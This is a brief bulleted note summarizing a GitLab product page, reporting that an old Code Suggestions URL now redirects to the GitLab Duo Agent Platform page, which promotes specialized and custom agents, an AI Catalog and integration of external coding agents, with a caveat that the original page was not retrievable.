    • Redirect: /solutions/code-suggestions/ now lands on about.gitlab.com/gitlab-duo-agent-platform/.
    • Current page: Promotes specialized agents for planning, coding, security analysis and analytics, an AI Catalog, and custom agents following org conventions.
    • Integrations: The page says external agents such as Claude Code and Codex can be integrated into GitLab workflows.
    • Scope today: “Agentic workflows” that carry a change through review, tests, security and pipelines to a merge request.
    • Source caveat: The original Code Suggestions page content was not retrievable; summary based on the redirect target and the title.
